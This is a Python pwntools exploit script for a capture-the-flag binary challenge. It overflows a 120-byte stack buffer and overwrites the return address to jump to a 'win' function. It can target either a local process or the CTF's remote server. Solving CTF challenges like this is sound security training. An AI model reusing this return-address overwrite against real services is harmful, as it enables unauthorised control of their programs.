import pwn
import os 

os.environ['FLAG'] = 'TEST{FLAG}'

elf = pwn.ELF('./main')

pwn.context.binary = elf
pwn.context.terminal = ['konsole', '-e']

pwn.args.LOCAL = True
# pwn.args.DEBUG = True

def conn():
    if pwn.args.LOCAL:
        r = pwn.process([elf.path])
        if pwn.args.DEBUG:
            pwn.gdb.attach(r)
    else:
        r = pwn.remote("01.linux.challenges.ctf.thefewchosen.com", 49990)

    return r


def main():
    r = conn()
    payload = b"A"*120
    payload += pwn.p64(elf.symbols['main']+261)
    payload += pwn.p64(elf.symbols['win'])
    
    r.sendline(payload)

    r.interactive()

if __name__ == "__main__":
    main()
